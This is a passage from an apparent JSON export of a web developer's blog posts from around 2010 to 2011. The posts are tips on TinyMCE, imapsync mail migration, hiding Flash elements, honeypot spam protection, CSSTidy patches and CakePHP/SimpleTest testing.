  "text": "<p>If you just want to add a presentational image in a tinyMCE editor, you'll find out very quickly that it will be wrapped in <code>&lt;p&gt;&lt;/p&gt;</code> without you asking.</p>\n<p>The question has been asked several times on the tinyMCE forums, but the answers never quite satisfied me. It ranges from the classical \"<em>Why do you want to do this ? You should better use &lt;insert semantic element and css here&gt;</em>\" to \"<em>Just do a regexp before displaying your content to remove the bad &lt;p&gt;</em>&lt;/p&gt;\".</p>\n<p>This clearly did not satisfy me.</p>\n<p>The solution was to define the<code> forced_root_block</code> setting value to <code>false</code>, allowing us to create any element on the top level, and not having it automatically wrapped in <code>&lt;p&gt;.</code></p>\n<h4>Fixing the side effect</h4>\n<p>Allowing for elements to be input directly in the root level has the nasty side effect of creating tinyMCE editor instances with a default text of, well, nothing, instead of the really usefull <code>&lt;p&gt;</code> tag. Also, if you do a Ctrl+A and delete all content, you'll end up with an empty editor without the initial <code>&lt;p&gt;</code> tags</p>\n<p>To fix this part, I just added an <code>onNodeChange </code>event to fire every time the content is changed. I test the current content and if empty add the <code>&lt;p&gt;</code> tag. There is a little subtelty though, to correctly place the caret where needed.</p>\n<p>In your <code>tinyMCE.init</code> call, just add the following setup key :</p>\n<pre><code lang=\"js\">tinyMCE.init({<br />[...]<br />\tsetup: function(editor) {<br />\t\teditor.onNodeChange.add(function(editor, cm, e, c, o) {<br />\t\t\tvar editorContent = editor.getContent();<br />\t\t\tif (editorContent===\"\") {<br />\t\t\t\t// We set content as a &lt;p&gt; containing a placeholder, then we delete the placeholder to place the caret<br />\t\t\t\teditor.setContent('&lt;p&gt;&lt;span id=\"__CaretPlacholder\"&gt;Placeholder&lt;/span&gt;&lt;/p&gt;');<br />\t\t\t\teditor.selection.select(editor.dom.select('#__CaretPlacholder')[0]);<br />\t\t\t\teditor.dom.remove(editor.dom.select('#__CaretPlacholder')[0]);<br />\t\t\t}<br />\t\t});<br />\t }),<br />[...]<br /> });</code></pre>\n<p>Before finding this solution, I tried the <code>onBeforeSetContent </code>callback, but due to a bug in the tinyMCE source, it couldn't handle well the case where the editor is empty. So I had to resort to a more generic callback.</p>",
  "publish_start": "2010-10-11 14:20:00",
  "slug": "preventing-tinymce-wrapping-img"
}, {
  "id": 239,
  "name": "Migrating mails from GMail to other IMAP server",
  "text": "<p>I have previously blogged on how <a title=\"Migration from IMAP to IMAP 1/2\" href=\"/blog/176:migrating-mails-imap-part-1-2\">I migrate mails</a> from <a title=\"Migration from IMAP to IMAP 2/2\" href=\"/blog/180:migrating-mails-from-imap-to-imap-part-2-2\">one IMAP server to another.</a> Today I had to migrate some mails again.</p>\n<p>My client's staff wasn't happy about the GMail webmail we gave them. The lack of a true \"Draft\" feature (one tha could be used and reused) had them drop a lot of productivity, so we decided to get back to Squirel Mail.</p>\n<p>I started by manually recreating all the email adresses on the back-end on the Dreamhost server. Once at least one address is created, Dreamhost automatically creates the matching A and MX records.</p>\n<p>I had to update my zone file on my registrar to update the previously MX and A records that were set to point to Google and updated to point to Dreamhost. I have to use an intermediate zone file on my registrar because I'm dealing with <a title=\"Limitation of the .fr TLD\" href=\"/blog/24:configuring-a-fr-with-dreamhost\">a limitation of the .fr TLD</a> here.</p>\n<p>Once the zone were updated and changes repercuted accross the network, I connected to the new Squirel mail. My inbox was empty.</p>\n<p>So I ran <code>imapsync</code> to copy all mails from the google hosted service to my new server.</p>\n<p>The syntax to be used is a little different than the one I mentioned on my previous post, so here it is :</p>\n<pre><code lang=\"sh\">imapsync --host1 imap.gmail.com --ssl1 --authmech1 LOGIN --user1 foo@domain.fr --passfile1 /path/to/pass1 --host2 208.97.*.* --user2 foo@domain.fr --passfile2 /path/to/pass2 --useheader=\"X-GMail-Received\" --useheader 'Message-Id' --noauthmd5</code></pre><p>After that, I reloaded my Squirel Mail inbox, and it was populated. I just had to do that for every account.</p>",
  "publish_start": "2010-11-16 15:49:32",
  "slug": "migrating-mails-gmail-imap-server"
}, {
  "id": 312,
  "name": "Show and hide Flash elements without redraw",
  "text": "<p>Imagine you have a Flash element in your HTML markup. If you apply any <code>show</code>/<code>hide </code>logic to it, the flash will be reset and played back to its first frame.</p>\n<p>Actually, as soon as you change the <code>display </code>property of an element, if forces all inner Flash element to be restarted.</p>\n<p>There are a few ways you can work around that, and here are the two main I'm using</p>\n<h4>Your Flash file is in a tab</h4>\n<p>Fairly common scenario, you have tabs on your page (maybe using jQuery UI or a custom code). When you display your Flash tab, all others are hidden, and when you display another tab, the Flash one is hidden.</p>\n<p>Instead of using <code>display:none</code> / <code>display:block</code>, we'll be a little more sneaky and not really \"hide\" the element, but simply put it out of the user view.</p>\n<p>Just apply the following CSS rule to the element you want to hide. It will just display it offscreen.</p>\n<pre><code lang=\"css\">.tabHidden {<br />\tposition:absolute;<br />\ttop:0px;<br />\tleft:-9999em;<br />}</code></pre>\n<p>Don't forget to add a <code>position:relative</code> to the HTML parent of your tab for the absolute positionning to work.</p>\n<h4>You have multiple Flash files in a list</h4>\n<p>This one is trickier. Imagine you have a list of elements, and each row contains a Flash file. You want to filter the list based on various criterias and only show the rows matching.</p>\n<p>You can't use the previous technique here because some elements of your list will be in relative positionning while others will be in absolute positionning. And everytime you change the <code>position </code>property of your element, the Flash will be reset.</p>\n<p>The trick here is to play with your element dimensions and visibility. You can change the <code>visibility </code>without triggering a redraw. As this will only make the element invisible but still taking space, you just have to put its <code>height </code>and <code>width </code>to <code>0</code> to make it effectively disappear.</p>\n<pre><code lang=\"css\">.listElementHidden {<br />\tvisibility:hidden;<br />\twidth:0px;<br />\theight:0px:<br />\tmargin:0px;<br />}</code></pre>\n<p>The <code>margin:0px</code> is here to clear any margin you might have defined around your element.</p>",
  "publish_start": "2011-09-16 15:57:36",
  "slug": "show-hide-flash-elements-redraw"
}, {
  "id": 186,
  "name": "Improved form spam protection",
  "text": "<p>My spam protection is really simple. Most spam bots will fill all input fields they'll find in a form. If one is named website or email, they will most certainly want to fill them first.</p>\n<p>So I've added to every form a fake input field with a <code>name=\"email\" </code>that have to stay empty. I also labeled it \"Spam bait\" and displayed a little sentence to tell my human readers to keep this field empty.</p>\n<p>I also hide the whole field using Javascript because most of the bots don't have Javascript enabled, but legitimate users do.</p>\n<h4>Does it work ?</h4>\n<p>To say the truth I don't know. In the previous version of this website I haven't any kind of spam protection and was receinving almost a dozen spam mails a day.</p>\n<p>Now that I've added this protection, I don't receive spam anymore. But that doesn't mean my protection is working, it may just mean that the spam bots needs a little time to adjust to the new website.</p>\n<h4>Improving the existing</h4>\n<p>One week ago, two spam comments managed to get past my protection. I have currently no way to judge my protection efficiency. Maybe that was the only two spam comments aimed at my website and I let them both slip in. Maybe I was under a mass attack and managed to block thousand of spam and those two were the only two to beat me.</p>\n<p>I don't know, I have absolutly no numbers on that.</p>\n<h4>Getting some stats</h4>\n<p>So today, I decided to add some extra measures. I'm keeping count of every spam I block (this number will be displayed below the comment list if at least one spam was blocked).</p>\n<p>I'll also log some informations when someone is posting a comment : headers sent, if javascript is enabled and the delay between displaying the form and submitting it.</p>\n<p>It is useless to build protection if you don't know what you want to be protected against. So I'll let the actual protection in place and will come back to check the numbers in a couple of weeks.</p>\n<p>I'll then know exactly how performs my existing spam protection and will be able to extract spam patterns from the information I'll gather.</p>\n<p>I think I'll add a timing system, to block comments that were posted too fast. If nothing works I'll use Akismet, but I want to try to defeat them on my own first.</p>",
  "publish_start": "2010-06-14 10:42:00",
  "slug": "improved-form-spam-protection"
}, {
  "id": 187,
  "name": "Meeting with Eric Daspet and Stoyan Stefanov in Paris",
  "text": "<p>On July 21st will be held an <a title=\"Performance meeting\" href=\"https://sites.google.com/a/survol.fr/webperf-user-group/evenements/21-juillet-2010\">informal meeting in Paris</a> for all the web developers that have an interest in web performance.</p>\n<p><a title=\"Eric Daspet blog on web performance\" href=\"http://performance.survol.fr/\" target=\"_blank\">Eric Daspet</a> and <a title=\"Stoyan Stefanov dev blog\" href=\"http://www.phpied.com/\" target=\"_blank\">Stoyan Stefanov</a> will be there and host a talk about performance impact on sales and some more technical less known facts.</p>\n<p>The first part will be in French while Stoyan's will be in English. If you have the chance to be in Paris in July, do not miss this event.</p>\n<p>I will, of course, be there. Eric Daspet is the french \"gourou\" on web performances, and Stoyan Stefanov is one of the main author of the Smushit plugin/websit.</p>\n<p>Web performance is a really interesting subject where there is so much to learn and so much to try.</p>",
  "publish_start": "2010-06-25 04:16:00",
  "slug": "meeting-with-eric-daspet-and-stoyan-stefanov-in-paris"
}, {
  "id": 188,
  "name": "CSS3 gradients with CSSTidy",
  "text": "<p>Gradients are one of the new cool stuff CSS3 brought with it. Like the others cool things, it still suffer from a partial implementation and vendor-specific properties.</p>\n<p>It also isn't correctly parsed by CSSTidy. Here I'll show you how to patch your CSSTidy to make it eat gradients correctly.</p>\n<h4>Quick and dirty patch</h4>\n<p>First, you'll need to edit the huge <code>parse()</code> method in c<code>sstidy.ph</code>p. You'll have to add a condition to explictly tell CSSTidy not to discard <code>-webkit-gradient</code> and <code>-moz-linear-gradient</code>.</p>\n<p>Just open your <code>csstidy.php</code> file, find the <code>parse()</code> method and locate the <code>case 'instr'</code> in the huge <code>switch </code>statement.</p>\n<pre><code lang=\"php\">if (!($this-&gt;str_char === ')' &amp;&amp; in_array($string{$i}, $GLOBALS['csstidy']['whitespace']) &amp;&amp; !$this-&gt;str_in_str)) {<br />\t$this-&gt;cur_string .= $temp_add;<br />} <strong>else {</strong><br /><strong>\tif ($this-&gt;sub_value==\"-webkit-gradient\" || $this-&gt;sub_value==\"-moz-linear-gradient\") {</strong><br /><strong>\t\t$this-&gt;cur_string.=' ';</strong><br /><strong>\t}</strong><br /><strong>}</strong><br /></code></pre><p>In bold, the <code>else </code>part to add. This will make sure your webkit and firefox gradient rules will get processed correctly.</p>\n<p>I don't really understand WHY it work, but it does. The <code>parse() </code>method is a huge uncommented mess, it is quite difficult to understand it. There must be a better way, a more generic one than specifying some properties, but I didn't manage to come with anything better than that.</p>\n<p>Fortunatly, the next part is cleaner.</p>\n<h4>Telling CSSTidy which properties not to merge</h4>\n<p>If you write a css like the following, only the latest (<code>color:white</code>) rule will get through CSSTidy.</p>\n<pre><code lang=\"css\">body {<br />\tcolor:red;<br />\tcolor:white;<br />}<br /></code></pre><p>That's logical, because CSSTidy will remove any unused CSS declaration. Unfortunatly, this is not what we want, because we need to declare several <code>background:</code> rules, one for Webkit, and one for Firefox.</p>\n<p>By looking at CSSTidy source code, we can find that it contain a quick fix to allow the <code>cursor:</code> property to be defined several time (to cope with the old <code>cursor:pointer</code> / <code>cursor:hand</code> issue).</p>\n<p>I just extended this quick fix to work for other properties as well, and even managed to allow them to be passed as a config value.</p>\n<h4>Defining the config value</h4>\n<p>First, open the <code>csstidy.php</code> file, and around line 310 you should find a list of default config values. Just add the following :</p>\n<pre><code lang=\"php\">$this-&gt;settings['multiple_properties'] = array('cursor', 'background');<br /></code></pre><p>This will define the default list of properties that are allowed to be defined several times in a css rule.</p>\n<p>Next, we'll edit the <code>set_cfg()</code> method to allow the passing of array values. Just replace the else statement with this one :</p>\n<pre><code lang=\"php\">else if(isset($this-&gt;settings[$setting]) &amp;&amp; $value !== '') {<br />\t// Merging array settings<br />\tif (is_array($value) &amp;&amp; is_array($this-&gt;settings[$setting])) {<br />\t\t$this-&gt;settings[$setting] = array_merge($this-&gt;settings[$setting], $value);<br />\t} else {<br />\t\t// Setting classic setting<br />\t$this-&gt;settings[$setting] = $value;<br />\t}<br /><br />\tif ($setting === 'template') {<br />\t\t$this-&gt;_load_template($this-&gt;settings['template']);<br />\t}<br />\treturn true;<br />}<br /></code></pre><p>You can now pass a list of properties to be added to the existing list by calling <code>-&gt;set_cfg('multiple_properties', array('property1', 'property2'));</code></p>\n<p>Now, find the <code>css_add_property(</code>) method, and around line 1066, change the<code> if (strtolower($property) == 'cursor') </code>if statement to this more generic one :</p>\n<pre><code lang=\"php\">if (in_array($property, $this-&gt;get_cfg('multiple_properties')))<br /></code></pre><p>And now, in <code>csstidy_print.php</code>, find the<code> _print()</code> method, and replace the <code>case PROPERTY</code> block with this (more concise) one :</p>\n<pre><code lang=\"php\">case PROPERTY:<br />\t// Converting back multiple properties<br />\t$multipleProperties = $this-&gt;parser-&gt;get_cfg('multiple_properties');<br />\tforeach($multipleProperties as $property) {<br />\t\t$propertyLength = strlen($property);<br />\t\tif (substr($token[1], 0, $propertyLength)==$property) $token[1] = $property;<br />\t}<br /><br />\t// Applying correct casing<br />\t$caseProperties = $this-&gt;parser-&gt;get_cfg('case_properties');<br />\tif ($caseProperties==2) $token[1] = strtoupper($token[1]);<br />\tif ($caseProperties==1) $token[1] = strtolower($token[1]);<br />\t<br />\t$out .= $template[4] . $this-&gt;_htmlsp($token[1], $plain) . ':' . $template[5];<br />break;<br /></code></pre><h4>And that's it</h4>\n<p>You now can have gradients compressed with CSSTidy. Well sort of, because this is just a quick and dirty patch, as I'm not the creator of CSSTidy.</p>\n<p>This could surely be improved in a less hacky way, for example by compressing the color code used in the gradients...</p>",
  "publish_start": "2010-06-28 09:20:00",
  "slug": "css3-gradients-with-csstidy"
}, {
  "id": 189,
  "name": "Breaking out of an if statement in PHP",
  "text": "<p>One pattern I use when writing new method is to put conditions that may end the script early on top. Like \"stop the method if the arguments are not right\" or \"stop the action if the user is not loggued in\".</p>\n<p>It allow me to avoid having nested <code>if</code>/<code>else </code>statement that became unreadable.</p>\n<p>Felix from Debuggable wrote <a title=\"Return home early\" href=\"http://debuggable.com/posts/programming-psychology-return-home-early:4811de9f-ae28-49c2-a7dc-2f154834cda3\" target=\"_blank\">something about that a while ago.</a></p>\n<p>This is a pretty easy pattern to follow when writing methods, but can be quite harder to achieve if you need to stick inside a main method. You just want to go \"out\" of the <code>if</code> statement, to continue the script, but not end the method.</p>\n<h4>Break to the rescue</h4>\n<p>You can't use the <code>break </code>keyword in an <code>if</code> statement like you would in a loop. It just throws an error.</p>\n<p>But, you can define a simple <code>do {} while (false)</code> loop and use the break goodness inside it.</p>\n<pre><code lang=\"php\">do {<br />\tif (empty($data)) break;<br />                  <br />\t$this-&gt;create($data);<br />                    <br />\tif (!$this-&gt;validates()) break;<br />                    <br />\t$this-&gt;save();<br />} while (false);<br /></code></pre>\n<p>This helped me some times, hope it can help someone else.</p>",
  "publish_start": "2010-06-30 00:56:00",
  "slug": "breaking-out-of-an-if-statement-in-php"
}, {
  "id": 190,
  "name": "Displaying a date in the correct locale with cakePHP",
  "text": "<p>The easiest way to display a date in a given format is to use a combination of <code>strftime()</code> and <code>strtotime()</code>.</p>\n<p>Sometimes, you also need your date to be displayed in a specific language. For example, for a french website, I needed a date to be displayed as \"<em>mardi 03 août 2010</em>\" instead of \"<em>Wednesday, August 3rd</em>\".</p>\n<h4>Setting the locale</h4>\n<p>To achieve that, you just have to tell PHP which locale to use when displaying date with <code>setlocale(LC_TIME, $locale)</code>.</p>\n<p>The value of <code>$locale</code> is OS dependent, though. For example, on a linux server, you have to set <code>fr_FR</code> while it is <code>fr</code> or even <code>french </code>on Windows.</p>\n<p>Fortunatly, you can pass an array of locales to <code>setlocale</code>(, and the system will use the first one it can find. You just have to pass an array containing all possible values and you'll be good to go.</p>\n<p>I wrote a little method that use the <code>L10n </code>object that comes with cakePHP to automate the creation of such an array. Just feed him a 3-letter language code and it will return an array of the most common locale names.</p>\n<pre><code lang=\"php\">function getLocales($lang) {<br />\t// Loading the L10n object<br />\tApp::import('L10n');<br />\t$l10n = new L10n();<br /><br />\t// Iso2 lang code<br />\t$iso2 = $l10n-&gt;map($lang);<br />\t$catalog = $l10n-&gt;catalog($lang);<br /><br />\t$locales = array(<br />\t\t$iso2.'_'.strtoupper($iso2).'.'.strtoupper(str_replace('-', '', $catalog['charset'])),    // fr_FR.UTF8<br />\t\t$iso2.'_'.strtoupper($iso2),    // fr_FR<br />\t\t$catalog['locale'],                // fre<br />\t\t$catalog['localeFallback'],        // fre<br />\t\t$iso2                            // fr<br />\t);<br />\treturn $locales;<br />}<br /></code></pre>\n<p>You may note that I set in first position a locale with the mention of the encoding. This is only used on Linux machines, Windows does not handle that. That's a pity, but I'll show you how to correctly make it work underWwindows.</p>\n<p>As a side note, <code>setlocale</code> will not <code>return false</code> if the locale is not found, it will just fail to load it.</p>\n<h4>Displaying date in UTF8</h4>\n<p>If your app is in UTF8 (and it should be !) you may run into problem when trying to display a simple <code>strftime(\"%B\", strtotime($date))</code> on Windows.</p>\n<p><code>%B</code> translate to the current month name. For a month like <em>Août</em> (<em>August</em>) the funny <em>û</em> will not get correctly displayed, because Windows does its locale translation in its native encoding.</p>\n<p>You'll need to manually encode it in utf8, but if you do so on a linux machine, as the result is already encoded in utf8 you may end in double encoding the same string, resulting in others display errors.</p>\n<p>Note also that if your format string itself contains utf8 encoded characters (like<code> %A %d %B %Y à %Hh%M</code>), encoding it in utf8 again will also result in wrong characters displayed.</p>\n<p>What I've done is creating a simple method in an helper that will take care of encoding the result if needed.</p>\n<pre><code lang=\"php\">function time($format, $date = null) {<br />\t// On Windows, we will force the utf8 encoding of the date<br />\tif (DIRECTORY_SEPARATOR == '\\\\') {<br />\t\treturn utf8_encode(strftime(utf8_decode($format), strtotime($date)));<br />\t}<br />\t// On linux, this is already taken care of by setlocale()<br />\treturn strftime($format, strtotime($date));<br />}<br /></code></pre>\n<p>This way, we make sure that the date is correctly displayed in utf8, no matter the OS, even if you already supply utf8 characters in the format string.</p>",
  "publish_start": "2010-07-05 04:36:00",
  "slug": "displaying-a-date-in-the-correct-locale-with-cakephp"
}, {
  "id": 191,
  "name": "Beginner's introduction to Unit Testing and TDD",
  "text": "<p>I first heard of TDD and Unit Testing one year ago, by reading discussions about cakePHP. Cake was boasting about its complete testing.</p>\n<p>Back in these days I only had a vague understanding of what that meant. I guessed it was a way to prove that the code you wrote did not have any bug, or if it had, you could find them easily and make sure that you did not break existing code with a new release.</p>\n<p>That sounded exciting and I tried to write some tests for my own app. I gave up really quickly as I found that you need both a good understanding of the inner workings of cake and some familiarity with testing before being able to write tests.</p>\n<p>Some weeks ago, I decided to gave it another try. This time I started by reading more general concepts about the whole testing thing before writing anything. That's how I learned that Unit Testing and TDD are two different thing, the former leading to the latter.</p>\n<h4>So, what exactly is Unit Testing ?</h4>\n<p>A Unit Test is a simple test (function) you write that will test that one tiny little part of your whole application is doing what it is supposed to do. Most of the time, you'll end up testing one particular method of one particular class. You pass a specified input parameter to you function, and you test that the returned value is the one you were expecting.</p>\n<p>Unit Testing is <em>just</em> that : writing automated tests for methods you wrote. You'll then have to run all your tests and you'll be able to spot in a matter of seconds which tests failed, and thus see where a bug occured. Testing this way is order of magnitude faster than manually testing your app, one page at a time.</p>\n<p>Before learning what Unit Testing was, I was writing my methods whenever I needed them and just assumed that they were bugless. Now, I can write a test to formerly prove that they are. And I can even re-run this same test every time I refactor my code to see if my refactoring did not broke any previous behavior.</p>\n<p>The more precise your tests are, the easier it will be for you to debug where the bug is coming from.</p>\n<h4>And what is Test Driven Development ?</h4>\n<p>TDD is a whole new way of writing code. Instead of writing your method then write the test for it, you write the test before. You can even write several tests before, in fact as much as you can think of.</p>\n<p>It forces you to conceptualise (in your head) what you exactly want your method to do. What inputs should be accepted, what should be returned, what are the edge cases, what arguments are optional, etc.</p>\n<p>Once you've done all this, you just write the tests for each of this things. Test your method with a specifically formatted input, and check the expected result. Do that for every edge case you can think of. Then, run the tests. It will fail, because you haven't even started writing the method. But that's ok, and should I say, that's the goal.</p>\n<p>Now you have a set of rules, kinda like specs. You know what your method should do because you've written that down with your tests. You can start writing your method, and you'll know that you haven't finished it until all the tests passes. Thanks to the tests, you'll know for sure when you're done on a specific method.</p>\n<p>Thanks to TDD, you'll have a precise measure of where you are in the development cycle. If all your code is test covered and that you only add new code that is also covered, you can release you app as often as you want.</p>\n<h4>And how is it good for me ?</h4>\n<p>First of all, you will know for sure when you're done working on a method. If all the tests passes, you're good. If at least one test fails, it means that you can't still use this method in production because it may have undesirable side effects.</p>\n<p>it will force you to better think about what you really want to do before writing anything. I used to rarely take time to stop and think, but instead rushed into writing code to \"make it work\". Now, I'm spending more time with a pen an paper before, writing down all I want my method to do.</p>\n<p>I didn't see the benefit of it at first, but I forced myself to do it, and it's suprising how fast you can see the benefits. It will allow you to see more easily edge cases you hadn't thought of, and prepare yourself in consequence.</p>\n<h4>But I spend so much time writing tests, while I could be adding new features instead !</h4>\n<p>Yeah, I thougt that too. Writing tests is a chore. It takes a lot of time, especially if you've never wrote any before (but it gets much easier with practice).</p>\n<p>Writing tests for an existing app is even more difficult. Most of the time, the code is not easily testable and will need refactoring to allow testing. While refactoring code just to test it may seem kind of useless (at least that's what I thought), the benefits are huge. You only have to write tests once, and the debug value it offers you will stay forever. Compare this to the time you'll have to spend manually debugging a complicated class.</p>\n<p>Tests are also universal and they act as a pretty good documentation. If you ever work in a team, tests are a great way to make other people understand what your code is supposed to do. And if someone else needs to edit your code, they'll just have to run the tests to see if they break something.</p>\n<p>It is true that writing testable code and corresponding tests takes time. But it is not true that you could spend this time on new features. If you don't write tests for a feature, how could you tell that it's bugless ? We can just have your word for it, while when using tests we have a boolean answer to this question. Tests passes, it works, tests failed, it does not work.</p>\n<p>If you don't know for sure that a feature is bugless, you'll never be sure if a bug won't appear later and that's you'll have to come back and track it down. Maybe the bug won't show until one month or two, but you know how hard it is to debug a two-month old code, even written by yourself.</p>\n<p>With tests, you do yourself a favor, by asserting that you won't have to get back to this code later. So yes, it will take longer to write a new feature with tests, but at least you'll be able to say \"Ok, it's done, and it's working\", while with a feature that hasn't been tested, you'll ended up saying \"Ok it's done, I think it should work. Well, we'll see...\".</p>\n<h4>You've convinced me, I want to start writing tests now.</h4>\n<p>Great !</p>\n<p>First, I discourage you to start and write tests for your whole application right now. The biggest the app, the faster you'll be fed up with tests. It's much more harder to write tests after, than before. So just write tests for one class or two at the moment, add new features to your app (using the TDD approach), and get back to writing tests to the rest of the app later.</p>\n<p>For your firsts tests, you can choose an existing class. I found that models are the easiest classes to tests. You'll need fixtures for that, but I won't detail it here, the cake documentation is clear enough on the subject. You'll also have to create a test case, but again, everything is in the documentation. If it does not feel clear enough for you, just ask in the comments and I'll add a more detailed explanation.</p>\n<p>And now, here are some advices I've learned, I thought I could share them with you :</p>\n<ul>\n<li>The number of tests you'll have to write is not dependent on the number  of methods you have in your class. Most of the methods will need several  tests, while some rare methods won't need any. Just write one test for  each outcome you want to test. The cake Core tests usually make one test  method for each method in the class. I prefer to make several small  tests, that way I can more easily spot the part that is failing.</li>\n<li>You can name your test methods the way you want, they just have to start  with <code>test</code>. Do not hesitate to be very specific in the  method name. I have methods called <code>test404ErrorIfInvalidUserId</code> or <code>test404ErrorIfNonExistentuser</code></li>\n<li>Make calls to <code>App::import()</code> at the top of your file to load every class you'll need.</li>\n<li>Use and abuse the <code>startTest </code>method. This method is called  before every test, this is a good way to reset vars to make sure one  previous test call will not impact subsequent calls. I got the habit to define a property of the test  case as the object I want to test. For example, when testing a model,  I'll write something along the lines of :<br />\n<pre><code lang=\"php\">function startTest() {<br />\t$this-&gt;model = ClassRegistry::init('User');<br />}</code></pre>\n</li>\n<li>Try to refactor you code to split logic into several small methods, each with its own goal and logic. This will be easier to test.</li>\n<li>If you have to test code that relies on an external library and make static calls to it, just wrap the static calls inside a method of your class and mock (see MockObjects) the method.</li>\n<li>You'll have to create a test case (extending <code>CakeWebTestCase</code>) to test view generation. This test case will be able to make get (using <code>get()</code>)queries to your site, and allowing you to test the resulting source code of the page against regular expression using <code>assertPattern()</code>/<code>assertNoPattern()</code></li>\n<li>If you have code that rely on <code>exit</code>, just replace that code to <code>$this-&gt;_stop()</code>, it's a method wrapping <code>exit </code>that was created just to make testing easier. If you have code using <code>die()</code>, then you're screwed.</li>\n</ul>\n<p>As I'm also still discovering Unit Testing in cake, I'll surely post other tips as I encounter them.</p>",
  "publish_start": "2010-07-23 12:01:00",
  "slug": "beginner-s-introduction-to-unit-testing-and-tdd"
}, {
  "id": 192,
  "name": "cakePHP testing tip : Creating or edit a datasource on the fly",
  "text": "<p>For one of the tests I'm currently writing, I needed to assert that my method was correctly returning an error if the connection to the database was impossible.</p>\n<p>I couldn't find an easy way to change datasource credentials once the app was initiated, so I decided to manually update the <code>ConnectionManager</code> inner values.</p>\n<p>Here's how I did it :</p>\n<pre><code lang=\"php\">// Getting the datasource cache in the ConnectionManager object<br />$connectionManagerInstance = ConnectionManager::getInstance();<br />$databaseConfig = &amp;$connectionManagerInstance-&gt;_dataSources;<br /><br />// Saving the initial setting for reverting it later<br />$_defaultConfig = $databaseConfig['default'];<br /><br />// Changing the password so the credentials will fail<br />$databaseConfig['default']-&gt;config['password'].= 'pass';<br /><br />// Getting the updated datasource<br />$connect = ConnectionManager::getDataSource('default');<br /><br />// Error handling when connection unavailable<br />[...]<br /><br />// And reverting the settings back<br />$databaseConfig['default'] = $_defaultConfig;<br /></code></pre>\n<p>This proved really useful when testing to simulate a database server error.</p>",
  "publish_start": "2010-07-13 15:29:00",
  "slug": "cakephp-testing-tip-creating-or-edit-a-datasource-on-the-fly"
}, {
  "id": 193,
  "name": "Using a fixture with a model using $useTable in cakePHP",
  "text": "<p>It seems that if you're creating a fixture for a model that uses an unconventional table name, the <code>CakeTestFixture </code>does not manage to correctly create the needed table when your test starts.</p>\n<p>In fact, it will try to insert the fixture records into the right table (the one defined in <code>$useTable</code>), but won't have created the table beforehand.</p>\n<p>In fact this is because it will correctly rely on the model <code>$useTable</code> property when inserting records but will try to guess the table name based on the model name when creating the table.</p>\n<p>Anyway, the quick fix I've found so far is to define the <code>$table</code> property of your fixture to match your model <code>$useTable</code>.</p>\n<pre><code lang=\"php\">class Client extends Model {<br />\tvar $useTable = 'users';<br />}<br /></code></pre><pre><code lang=\"php\">class ClientFixture extends CakeTestFixture {<br />\tvar $table= 'users';<br />}<br /></code></pre><p>I've filed a bug report as well as suggested a fix to allow cake to automatically use the correct table.</p>",
  "publish_start": "2010-07-15 15:25:00",
  "slug": "using-a-fixture-with-a-model-using-usetable-in-cakephp"
}, {
  "id": 194,
  "name": "Catching PHP errors with simpleTest",
  "text": "<p>I needed to write a test that should fail if the method I was testing triggered a PHP <code>E_NOTICE</code> error (namely, an \"<em>undefined index</em>\" kind of error).</p>\n<p>SimpleTest provides both <code>expectError()</code> and <code>expectException()</code> methods. I have only been able to make the former work with manually triggered errors (using <code>trigger_error()</code>), and the latter only catchs Exceptions.</p>\n<p>After hours of googling, and reading SimpleTest source code, I finally managed to come up with a solution.</p>\n<h4>Redefining the error handler</h4>\n<p>It still amaze me how awfuly complicated it is to do such a simple thing. Anyway, the key is to redefine the error handler function so you can shortcircuit both PHP and SimpleTest on the way they managed errors.</p>\n<p>Doing so you can detect when the code you test produce an error. Based on the <code>$errno</code> and <code>$errstr</code> supplied, you can even filter to exactly the error you're looking for.</p>\n<p>Unfortunatly, you'll be blocked inside your newly defined <code>error_handler</code> function. It means you won't have access to the test, so won't be able to call <code>$this-&gt;pass()</code> nor <code>$this-&gt;fail()</code>, because <code>$this</code> does not reference anything.</p>\n<h4>Throw me out of here</h4>\n<p>The only trick I've found to get out of this function and back in the scope of your test is to throw an Exception. Namely, an <code>ErrorException</code>.</p>\n<p>Doing so we can rewrote our test to put the part that is triggering the error inside a <code>try </code>/ <code>catch </code>statement and manually pass or fail the test.</p>\n<h4>Don't you forget something ?</h4>\n<p>One <strong>very</strong> important thing not to forget here is to restore the <code>error_handler</code> to its original value once you won't need it. If you don't, you will surely broke all your subsequent tests because SimpleTest use its own <code>error_handler</code> too.</p>\n<p>We have to restore it in two places, both when the code triggered and error / throw an exception and when it don't.</p>\n<h4>Cut the speech, show me the code</h4>\n<p>Okay, here's the code. Don't forget to adapt the condition in the <code>error_handler</code> to match your error.</p>\n<pre><code lang=\"php\">function testGotUndefinedIndex() {\n    // Overriding the error handler\n    function errorHandlerCatchUndefinedIndex($errno, $errstr, $errfile, $errline ) {\n        // We are only interested in one kind of error\n        if ($errstr=='Undefined index: bar') {\n            //We throw an exception that will be catched in the test\n            throw new ErrorException($errstr, 0, $errno, $errfile, $errline);\n        }\n        return false;\n    }\n    set_error_handler(\"errorHandlerCatchUndefinedIndex\");\n\n    try {\n        // triggering the error\n        $foo = array();\n        echo $foo['bar'];\n    } catch (ErrorException $e) {\n        // Very important : restoring the previous error handler\n        restore_error_handler();\n        // Manually asserting that the test fails\n        $this-&gt;fail();\n        return;\n    }\n\n    // Very important : restoring the previous error handler\n    restore_error_handler();\n    // Manually asserting that the test succeed\n    $this-&gt;pass();\n}\n</code></pre>\n<p> </p>",
  "publish_start": "2010-07-15 21:11:00",
  "slug": "catching-php-errors-with-simpletest"
}, {
  "id": 195,
  "name": "Javascript speed tip : reduce variable lookup",
  "text": "<p>It appears that, according to this video, when inside a Javascript function (or closure), if you want to access a variable, the closer your scope is to this variable, the faster you'll get it.</p>\n<p>In simpler words, accessing a global variable (like <code>document</code>, or <code>window</code>) from inside a function will always be slower that accessing a locally defined variable.</p>\n<p>It also means that, when inside a method of an object, accessing a variable defined in this method will be faster that accessing a property of the parent object, which itself will be faster that accessing a global variable.</p>\n<p>So, for example, if you need to access at least twice a global variable like <code>window </code>or <code>document </code>in a method, you'd better cache it in a local variable first.</p>\n<pre><code lang=\"js\">function myTestFunction() {<br />\tvar button = document.getElementById('button');<br />\tvar header = document.getElementById('header');<br />}<br /></code></pre>\n<p>is bad and could be rewritten as :</p>\n<pre><code lang=\"js\">function myTestFunction() {<br />\tvar doc = document;<br />\tvar button = doc.getElementById('button');<br />\tvar header = doc.getElementById('header');<br />}<br /></code></pre>\n<p> </p>",
  "publish_start": "2010-07-19 09:16:00",
  "slug": "javascript-speed-tip-reduce-variable-lookup"
}, {
  "id": 254,
  "name": "Firing cakePHP components callbacks on error404",
